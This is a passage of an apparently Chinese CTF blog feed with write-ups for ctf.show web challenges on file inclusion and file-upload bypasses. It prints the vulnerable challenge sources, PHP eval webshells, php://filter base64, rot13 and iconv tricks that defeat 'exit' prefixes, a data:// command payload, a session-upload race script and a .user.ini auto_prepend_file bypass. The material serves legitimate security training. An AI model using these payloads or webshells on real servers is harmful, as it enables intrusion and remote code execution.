class="built_in">format</span>(sessID))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">in</span> response.text: <span class="comment">#如果成功打开文件，则竞争成功！</span></span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-16 19:34:45</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>不过这里脚本不给玩,我们试试burp</p><p>构造一个上传表单</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://718ac6a2-5a12-4d56-a573-3a13cb88450b.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的file_put_contents将字符串写入文件中了</p><p>先同php:&#x2F;&#x2F;filter的base64-decode流写入一个zf.php文件,要进行双url编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=zf.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%61%25%36%36%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure><p>还要在处理一下,由于解码时会去除无法解码字符,所以最后剩下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;</span><br><span class="line">phpdie</span><br></pre></td></tr></table></figure><p>总共六个字符,而base64算法解码时是4个byte为一组,那么我们需要将其补充成8个byte,而a是一个byte,那么增加两个a就可以正常解码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[zf]);?&gt;-&gt; PD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4=  -&gt; aaphpdiePD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4=</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403214907284.png" alt="image-20220403214907284"></p><p>可以看到成功解码了,同样如果不补齐就会出错</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403214930438.png" alt="image-20220403214930438"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最终上传</span><br><span class="line">/?filespan><br><span class="line">POST</span><br><span class="line">content=aaPD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4=</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403215146506.png" alt="image-20220403215146506"></p><p>接着访问zf.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403215404107.png" alt="image-20220403215404107"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403215411651.png" alt="image-20220403215411651"></p><h2 id="php-filter的妙用"><a href="#php-filter的妙用" class="headerlink" title="php:filter的妙用"></a>php:filter的妙用</h2><h3 id="xxe中的使用"><a href="#xxe中的使用" class="headerlink" title="xxe中的使用"></a>xxe中的使用</h3><p>由于xxe漏洞的特殊性,我们读取html PHP文件时可能会抛出错误,原因是php基于标签的脚本语言,&lt;?php ?&gt;这个语法和xml相符合,所以在解析xml的时候会被误认为是xml,而其中内容,又有可能与标准xml冲突,所以导致了出错</p><p>php:&#x2F;&#x2F;filter是php语言特有的协议流,作用是作为一个中间流来处理其他流,比如我们可以使用如下将post内容转换成bse64输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readfile(&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;)</span><br></pre></td></tr></table></figure><p>所以在xxe中,我们也可以将php等容易引发冲突的文件流用php:filter协议流过一遍</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=./xxe.php</span><br></pre></td></tr></table></figure><h3 id="巧用编码与解码"><a href="#巧用编码与解码" class="headerlink" title="巧用编码与解码"></a>巧用编码与解码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>$content在开头增加了exit过程,导致即使我们成功写入一句话,也执行不了(在实战中,通常出现在缓存 配置文件等地方,不允许用户直接访问的文件,都会被加上if(!defind(xxx))exit;这类的限制)</p><p>这里的$_POST[“filename”]是可以控制协议的,我们即可使用php:&#x2F;&#x2F;filter协议来绕过,使用php:&#x2F;&#x2F;filter流的base64-decode方法,将$content解码,利用php base64_decode函数特性去除exit</p><p>在base64编码中只包含64个可打印字符,而php在解码base64时,遇到不在其中的字符时,将会跳过这些字符,仅将合法字符组成一个新的字符串进行解码.</p><p>所以base64_decode可以理解成</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;|[^a-z0-9A-Z+/]&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>所以当$content被加上了&lt;?php exit;?&gt;之后,我们可以使用php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base-decode类首先对其解码.在解码过程中,字符&lt; ? ; &gt; 空格等一共有七个字符不符合base64编码的字符方位将被忽略,所以最终被解码的字符仅有”phpexit”和我们传入的其他字符.”phpexit”一共七个字符,因为base64算法解码时是4个byte一组,所以给他增加一个”a”一共八个字符.这样 “phppexita被正常解码,而后面传入的webshell的base64内容也被正常解码.结果就是&lt;?php exit; ?&gt;没有了</p><h3 id="字符串操作方法"><a href="#字符串操作方法" class="headerlink" title="字符串操作方法"></a>字符串操作方法</h3><p>还可以使用php:filter字符串处理方法来去除exit.&lt;?php exit;?&gt;实际上是一个xml标签,既然是xml标签,我们就可以使用strip_tags函数去除它,而php:&#x2F;&#x2F;filter刚好支持</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=string.strip_tags/resource=php://input</span><br></pre></td></tr></table></figure><p>php:&#x2F;&#x2F;filter允许使用多个过滤器,我们可以先将webshell用base64编码,在调用完成strip_tags后再进行base64-decode</p><p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了</p><p>当然，这个方法的条件就是不开启短标签。</p><h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-17 02:27:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><p>绕过等号就好</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgYGxzYCcpOw</span><br></pre></td></tr></table></figure><h1 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h1><p>要分析视频,我不会</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403215822599.png" alt="image-20220403215822599"></p><p>可以正常读文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403220424228.png"></p><p>试了几个常见的就出来了,也可以爆破</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403220620645.png" alt="image-20220403220620645"></p><h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: yu22x</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-01 18:16:59</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><p>应该是让用别的过滤器</p><h2 id="php-x2F-x2F-filter的各种过滤器"><a href="#php-x2F-x2F-filter的各种过滤器" class="headerlink" title="php:&#x2F;&#x2F;filter的各种过滤器"></a>php:&#x2F;&#x2F;filter的各种过滤器</h2><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filter的各种过滤器</a></p><p>这里使用convert.iconv.*</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.iconv.ucs-2be.ucs-2le/resource=5.php</span><br><span class="line">POST: </span><br><span class="line">contents=?&lt;hp pvela$(G_TE&#x27;[&#x27;a)] ;&gt;?</span><br></pre></td></tr></table></figure><p>原因</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">file_put_contents(&quot;php://filter/convert.iconv.ucs-2be.ucs-2le/resource=5.php&quot;</span><br><span class="line">, &quot;&lt;?php die();?&gt;?&lt;hp pvela$(G_TE&#x27;[&#x27;a)] ;&gt;?&quot;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403221348284.png" alt="image-20220403221348284"></p><p>可以看到前面不符合php的格式</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403221752628.png" alt="image-20220403221752628"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403221802615.png" alt="image-20220403221802615"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/ctfshow/ctf.show/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/ctfshow/ctf.show/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h1><h2 id="js验证"><a href="#js验证" class="headerlink" title="js验证"></a>js验证</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262148095.png" alt="image-20220326214849015"></p><p>抓包直接绕过</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262157563.png" alt="image-20220326215712504"></p><p>这只能上传png</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262157883.png" alt="image-20220326215724837"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262157152.png" alt="image-20220326215748109"></p><h1 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h1><h2 id="content-type验证"><a href="#content-type验证" class="headerlink" title="content-type验证"></a>content-type验证</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301313985.png" alt="image-20220330131322909"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;zf&quot;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301323253.png" alt="image-20220330132324163"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301323397.png" alt="image-20220330132331339"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301325953.png" alt="image-20220330132523896"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-24 21:20:33</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br></pre></td></tr></table></figure><h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><h2 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</span><br><span class="line">除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[&#x27;DOCUMENT_ROOT&#x27;] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</span><br><span class="line">在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</span><br></pre></td></tr></table></figure><p>具体的配置可以看<a href="https://www.php.net/manual/en/ini.list.php">该链接</a>,也就是里面除了PHP_INI_SYSTEM模式的配置之外都可以在.user.ini进行重写.那么我们就去找我们需要用到的配置,发现auto_append_file和auto_prepend_file,一个相当于在每个php文件尾加上include(“xxx”),一个相当于在文件头加上include(“xxx”)其中xxx就是auto_append_file的值</p><p>为了利用auto_append_file,我们首先上传一个带木马的图片,接着上传.user.ini内容为auto_append_file&#x3D;”xxx”xxx为我们上传的图片文件名.这样就在每一个php文件上包含了我们的木马文件.</p><p>但是这种方式是有前提的,是必须要在.user.ini目录下面有一个.PHP的文件才能进行包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=zf.png</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409154036831.png" alt="image-20220409154036831"></p><p>可见这里是存在的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409153852085.png" alt="image-20220409153852085"></p><p>接着上传一个zf.png文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409154548671.png" alt="image-20220409154548671"></p><p>连接upload&#x2F;index.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409154653789.png" alt="image-20220409154653789"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409154721284.png" alt="image-20220409154721284"></p><p>upload.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-24 21:46:57</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span 